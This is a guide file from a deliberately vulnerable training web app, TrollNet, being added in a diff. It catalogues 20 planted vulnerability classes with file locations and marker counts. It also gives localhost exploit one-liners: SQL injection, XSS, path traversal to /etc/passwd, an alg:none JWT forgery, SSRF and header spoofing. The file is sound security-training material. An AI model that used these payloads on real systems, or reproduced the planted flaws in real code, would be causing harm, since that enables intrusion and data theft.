@@ -1,0 +1,219 @@
+TrollNet - vulnerabilities.txt
+==============================
+
+STATUS: INTENTIONALLY VULNERABLE TRAINING BUILD
+This repository is a laboratory, not a secure application. Every issue below was added
+on purpose so players can find and exploit it. Keep it on 127.0.0.1 or a disposable VM.
+Do not deploy it, expose it to the internet, or copy these patterns into real software.
+
+
+1. HOW MANY VULNERABILITIES ARE THERE?
+--------------------------------------
+
+20 distinct vulnerability classes, numbered VULN-SPOT #01 through #20.
+
+48 marker comments exist in source/config files (README.md documentation is excluded
+from that number). If you also count the 20 rows in README.md, grep finds 68 matches.
+
+Markers per class (source/config only):
+
+    #01 SQL Injection ........................... 1
+    #02 Stored XSS .............................. 3
+    #03 IDOR / Broken Access Control ............ 2
+    #04 Mass Assignment ......................... 2
+    #05 CSRF .................................... 4
+    #06 SSRF .................................... 4
+    #07 Path Traversal / LFI .................... 1
+    #08 Missing Authentication .................. 5
+    #09 Timing Side Channel ..................... 2
+    #10 User Enumeration ........................ 2
+    #11 Missing Rate Limiting / Brute Force ..... 2
+    #12 Weak Password Hashing ................... 2
+    #13 Improper JWT Signature Verification ..... 1
+    #14 Race Condition (TOCTOU) ................. 1
+    #15 Sensitive Data Exposure ................. 3
+    #16 Hard-coded Credentials .................. 6
+    #17 Spoofable Client IP ..................... 2
+    #18 Error Message Information Leak .......... 3
+    #19 Token in Browser Storage ................ 1
+    #20 Clickjacking ............................ 1
+                                                  --
+                                    TOTAL ...... 48
+
+Some classes have several markers because the same weakness spans multiple layers
+(for example stored XSS needs both the React rendering and the nginx CSP to be weak).
+
+
+2. HOW TO FIND THEM
+-------------------
+
+A. Search for the marker (the intended way):
+
+    grep -rn --exclude-dir=bin --exclude-dir=obj --exclude-dir=node_modules \
+        --exclude-dir=dist "VULN-SPOT" src frontend/src frontend/nginx.conf \
+        docker-compose.yml .env.example
+
+B. Count all markers / count per class:
+
+    grep -rho --exclude-dir=bin --exclude-dir=obj --exclude-dir=node_modules \
+        --exclude-dir=dist "VULN-SPOT #[0-9][0-9]" src frontend/src \
+        frontend/nginx.conf docker-compose.yml .env.example | wc -l
+
+    grep -rho --exclude-dir=bin --exclude-dir=obj --exclude-dir=node_modules \
+        --exclude-dir=dist "VULN-SPOT #[0-9][0-9]" src frontend/src \
+        frontend/nginx.conf docker-compose.yml .env.example | sort | uniq -c
+
+C. Search in your IDE for "VULN-SPOT". Each comment names the CWE, shows a way to try
+   the exploit, and states the fix.
+
+D. Find them by code smell without using the markers:
+
+    #01  FromSqlRaw with an interpolated string
+    #02  dangerouslySetInnerHTML={{ __html: ... }}
+    #03  DELETE endpoints with no CanModify(...) call
+    #04  CreatePostRequest with AuthorId / IsTrending / CreatedAt fields
+    #05  "trollnet.token" cookie + SetIsOriginAllowed(_ => true)
+    #06  AddHttpClient() + POST /api/link-preview
+    #07  Path.Combine(AppContext.BaseDirectory, name) with no containment check
+    #08  MapGroup("/internal/posts") with no RequireInternalApiKey()
+    #09  expected == provided / string equality on secrets
+    #10  "No account with username" vs "Wrong password"
+    #11  MapPost("/login") and /submit without RequireRateLimiting(...)
+    #12  SHA256.HashData(...)
+    #13  ValidateIssuerSigningKey = false / RequireSignedTokens = false
+    #14  objective.IsCompleted = true followed by SaveChangesAsync (no conditional UPDATE)
+    #15  ObjectiveDto(..., string Flag) exposed by GET /api/objectives
+    #16  literal passwords/secrets in docker-compose.yml
+    #17  KnownIPNetworks.Add(0.0.0.0/0) + $proxy_add_x_forwarded_for
+    #18  UseDeveloperExceptionPage()
+    #19  localStorage.getItem('trollnet.token')
+    #20  frame-ancestors * and no X-Frame-Options
+
+
+3. HOW TO TRY THEM (locally)
+----------------------------
+
+Start the lab:
+
+    docker compose up --build
+
+Open http://localhost:8080. The UI creates a guest player automatically.
+Reset the database and containers when you want a clean game:
+
+    docker compose down -v
+
+Useful tools: browser DevTools (Network tab), curl, Burp Suite / OWASP ZAP.
+Get a token for authenticated calls:
+
+    curl -s -X POST http://localhost:8080/api/auth/guest | jq -r .token
+
+Use it either as "Authorization: Bearer <token>" or as "Cookie: trollnet.token=<token>".
+
+Quick reference (full details live in the code comments and README.md):
+
+    #01  curl -G --data-urlencode "query=' OR 1=1 --" \
+             http://localhost:8080/api/posts/search
+    #02  Post: <img src=x onerror="alert(document.domain)">
+    #03  curl -X DELETE http://localhost:8080/api/posts/1 -H "Authorization: Bearer <token>"
+    #04  curl -X POST http://localhost:8080/api/posts -H "Authorization: Bearer <token>" \
+             -H 'Content-Type: application/json' \
+             -d '{"content":"hi","authorId":999,"authorName":"admin","isTrending":true}'
+    #05  A malicious page with fetch(..., {credentials:'include'}) against /api/posts
+    #06  curl -X POST http://localhost:8080/api/link-preview \
+             -H 'Content-Type: application/json' \
+             -d '{"url":"http://social-service:8080/health"}'
+    #07  curl -G --data-urlencode 'name=../../../../etc/passwd' \
+             http://localhost:8080/api/posts/attachment
+    #08  curl -X POST http://localhost:8080/internal/posts \
+             -H 'Content-Type: application/json' \
+             -d '{"authorName":"intruder","content":"pwned","isTrending":false}'
+    #09  Measure /api/objectives/<id>/submit timings while guessing prefixes
+    #10  Compare login responses for an unknown user vs a wrong password
+    #11  Send many /api/auth/login or /api/objectives/<id>/submit attempts
+    #12  Register two users with the same password; hashes are identical
+    #13  Send a JWT with {"alg":"none"} and {"role":"Admin"} to /api/auth/me
+    #14  Send two correct flag submissions for the same objective in parallel
+    #15  curl http://localhost:8080/api/objectives | jq '.[0].flag'
+    #16  Log in with admin / admin1234; JWT/DB/internal secrets are in docker-compose.yml
+    #17  Add "X-Forwarded-For: 1.2.3.4" to requests to change the rate-limit bucket
+    #18  curl -G --data-urlencode "query='" http://localhost:8080/api/posts/search
+    #19  In DevTools console: localStorage.getItem('trollnet.token') after XSS
+    #20  Embed http://localhost:8080 in an <iframe> on another page
+
+
+4. WHERE TO LOOK (file map)
+---------------------------
+
+    src/Services/SocialService/Endpoints/PostEndpoints.cs   #01 #03 #04 #07
+    src/Services/SocialService/Endpoints/Contracts.cs       #04
+    src/Services/SocialService/Endpoints/InternalEndpoints.cs #08
+    src/Services/SocialService/Program.cs                   #18
+    src/Services/AuthService/Endpoints/AuthEndpoints.cs     #10 #11 #12
+    src/Services/AuthService/Data/DbSeeder.cs               #12
+    src/Services/AuthService/Program.cs                     #18
+    src/Services/GameService/Endpoints/GameEndpoints.cs     #06 #09 #11 #14 #15
+    src/Services/GameService/Program.cs                     #06 #18
+    src/Gateway/Program.cs                                  #05 #08
+    src/Gateway/appsettings.json                            #06 #08
+    src/Shared/TrollNet.Shared/Auth.cs                      #05 #13
+    src/Shared/TrollNet.Shared/InternalApi.cs               #09
+    src/Shared/TrollNet.Shared/Hosting.cs                   #17
+    frontend/src/components/PostCard.tsx                    #02
+    frontend/src/components/ObjectivesView.tsx              #15, link to browser tips
+    frontend/src/components/TipsView.tsx                    in-browser tips UI
+    frontend/src/vulnerabilityTips.ts                       tip text used by the UI
+    frontend/src/api.ts                                     #05 #15 #19
+    frontend/nginx.conf                                     #02 #08 #17 #20
+    docker-compose.yml                                      #16
+    .env.example                                            #16
+    README.md                                               full table with CWE links
+    scripts/demo_vulnerabilities.py                         --scan / --demo / --tips automation
+    vulnerability_tips.txt                                 printable beginner explanations
+
+
+5. AUTOMATED PRESENTATION SCRIPT
+-------------------------------
+
+The same explanations are built into the browser UI: open the Tips tab, or click
+"Stuck? Open the training tips" / "Need a hint? (#NN)" on the Objectives screen. Tips can be
+searched by number, name, CWE or keyword. Each objective carries a tipId; all current
+templates point to #15 because that is the vulnerability that exposes every objective
+flag. The leaked flag is blurred by default with a Reveal button, but the blur is only
+cosmetic: the value remains in the DOM and the anonymous API response.
+
+Because objectives now have a TipId column, reset an existing lab with
+"docker compose down -v" after updating.
+
+scripts/demo_vulnerabilities.py does the jobs from this document, plus explanations:
+
+    python3 scripts/demo_vulnerabilities.py --scan              # find/verify all markers
+    python3 scripts/demo_vulnerabilities.py --tips              # plain tips for all 20
+    python3 scripts/demo_vulnerabilities.py --tip 7             # one tip (#07 or 7)
+    python3 scripts/demo_vulnerabilities.py --demo --explain    # tip, then evidence, per class
+    python3 scripts/demo_vulnerabilities.py --all --locations   # scan + demo with file:line output
+
+The same tips are saved in vulnerability_tips.txt for printing. RUNTIME means the script
+observed the issue over HTTP; STATIC means it proved it from the source (timing/hashing
+checks are noisy or read-only). Start the stack first with "docker compose up --build"
+for --demo/--all; --scan/--tips work without it. The script reports PASS/FAIL for all 20
+classes, prints evidence, and ends with a summary. A clean run shows "20/20" checks
+passed. It is local-only and creates temporary posts/users; reset with
+"docker compose down -v" afterwards.
+
+You can also run the same flags in Docker with the one-shot "demo" profile. The helper
+container uses TROLLNET_BASE_URL=http://frontend:8080, so no --base-url is needed:
+
+    docker compose --profile demo run --rm --no-deps demo --scan
+    docker compose --profile demo run --rm --no-deps demo --tips
+    docker compose up -d
+    docker compose --profile demo run --rm demo --demo --explain
+    docker compose --profile demo run --rm demo --all --locations
+
+
+6. RULES
+--------
+
+- Run only on your own machine or an isolated training VM.
+- Do not point these endpoints at systems you do not own.
+- Reset with "docker compose down -v" between exercises if state interferes.
+- Every marker comment includes the fix; read it after exploiting the issue.
